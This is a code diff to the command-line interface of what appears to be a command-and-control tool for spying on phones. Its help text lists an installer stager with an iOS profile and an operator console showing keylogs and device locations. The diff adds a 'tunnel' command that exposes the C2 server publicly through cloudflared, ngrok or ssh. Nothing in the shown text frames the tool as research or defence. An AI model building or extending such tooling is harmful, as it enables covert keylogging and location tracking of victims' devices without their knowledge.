@@ -30,6 +30,7 @@ HELP: List[tuple] = [
     ("make stager [host]", "one-command installer + landing page + iOS profile"),
     ("make ios [url]", "WebClip profile + PWA link for iPhone"),
     ("run", "live operator UI (sessions, feed, keylog, location)"),
+    ("tunnel [provider]", "expose the C2 publicly (cloudflared/ngrok/ssh)"),
     ("sessions", "list known devices"),
     ("doctor", "toolchain readiness"),
     ("help / clear / quit", "this list / clear screen / leave"),
@@ -184,6 +185,13 @@ def interactive() -> None:
                 _print_sessions()
             elif verb == "doctor":
                 raise SystemExit(builder.doctor())
+            elif verb == "tunnel":
+                from . import tunnel
+
+                port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 8443
+                url = tunnel.start(port, args[0] if args and not args[0].isdigit() else "auto")
+                if not url:
+                    print(_colored("  no tunnel available — install cloudflared or ngrok", YELLOW))
             elif verb == "run":
                 key = server.load_psk(os.path.join(store.ROOT, "psk.txt"))
                 ui.run("0.0.0.0", 8443, key, _host_from_config() or "http://127.0.0.1:8443")
